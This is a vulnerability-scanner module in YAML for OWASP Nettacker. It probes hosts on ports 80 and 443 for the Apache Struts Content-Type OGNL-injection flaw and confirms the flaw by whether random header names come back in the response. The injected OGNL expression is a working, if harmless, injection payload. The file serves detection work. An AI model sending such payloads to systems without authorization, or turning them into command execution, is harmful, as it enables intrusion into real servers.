info:
  name: apache_struts_vuln
  author: OWASP Nettacker Team
  severity: 3
  description:
  reference:
  profiles:
    - vuln
    - vulnerability
    - http
    - low_severity
    - apache_struts

payloads:
  - library: http
    verify: false
    timeout: 3
    cert: ""
    stream: false
    proxies: ""
    steps:
      - method: get
        headers:
          User-Agent: "{user_agent}"
          Content-Type:
            nettacker_fuzzer:
              input_format: "#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader({{random_string}},{{random_string}}"
              suffix: ")}}.multipart/form-data"
              prefix: "%{{"
              interceptors:
              data:
                random_string:
                  - sdfhasd
                  - dsfasda
                  - ksdfkdl
          Accept: "*/*"
        url:
          nettacker_fuzzer:
            input_format: "{{schema}}://{target}:{{ports}}/"
            prefix: ""
            suffix: ""
            interceptors:
            data:
              schema:
                - "http"
                - "https"
              ports:
                - 80
                - 443
        response:
          condition_type: or
          conditions:
            headers:
              sdfhasd:
                regex: sdfhasd
                reverse: false
              dsfasda:
                regex: dsfasda
                reverse: false
              ksdfkdl:
                regex: ksdfkdl
                reverse: false